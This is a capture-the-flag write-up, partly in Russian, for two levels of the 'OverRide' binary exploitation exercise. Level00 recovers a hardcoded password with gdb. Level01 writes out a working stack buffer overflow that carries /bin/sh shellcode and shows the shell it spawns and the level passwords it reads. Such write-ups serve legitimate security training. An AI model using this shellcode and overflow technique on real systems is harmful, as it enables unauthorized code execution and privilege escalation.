# override

LEVEL00
		
level00@OverRide:~$ ./level00
***********************************
* 	     -Level00 -		  *
***********************************
Password:
		
Видим, что требуется пароль.
		
$ gdb level00
		
В main происходит сравнение строки, которая подается в качестве пароля с 0x149c, что соответствует  5276 в десятичной.
		
0x080484e7 <+83>:	cmp    $0x149c,%eax

Если подается что-то другое то команда jne перебрасывается мимо необходимой команды system.

0x080484ec <+88>:	 jne    0x804850d <main+121>

$ ./level00
***********************************
* 	     -Level00 -		  *
***********************************
Password:5276

Authenticated!

$ cat /home/users/level01/.pass
uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

LEVEL01

 (cat /tmp/user ; cat) | ./level01

python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\n' + 'A'*80 + '\x08\x04\xa0\x47'[::-1]" > /tmp/test

level01@OverRide:~$ cat /tmp/test - | ./level01

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
